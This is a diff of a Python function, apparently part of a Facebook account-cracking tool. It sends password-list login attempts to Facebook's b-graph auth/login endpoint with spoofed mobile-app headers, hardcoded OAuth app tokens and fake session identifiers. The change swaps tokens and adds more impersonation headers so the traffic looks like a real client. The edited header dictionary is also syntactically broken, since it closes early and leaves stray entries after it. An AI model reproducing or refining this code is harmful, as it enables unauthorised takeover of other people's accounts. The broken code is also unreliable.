@@ -532,13 +532,18 @@ def api3(ids,names,passlist):
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':str(random.randint(2e4, 4e4)),
-                                        'x-fb-connection-type':'MOBILE.WCDMA',
-                                        'Authorization':'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
+                                        'x-fb-connection-type':'unknown',
+                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua_string,
                                         'x-fb-net-hni':str(random.randint(2e4, 4e4)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
+                                        'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                                        'x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','x-FB-Request-Analytics-Tags': 'graphservice',
+                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+                                        'Connection': 'Keep-Alive'},
+                                        
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':'Liger'}
                                 url = 'https://b-graph.facebook.com/auth/login'
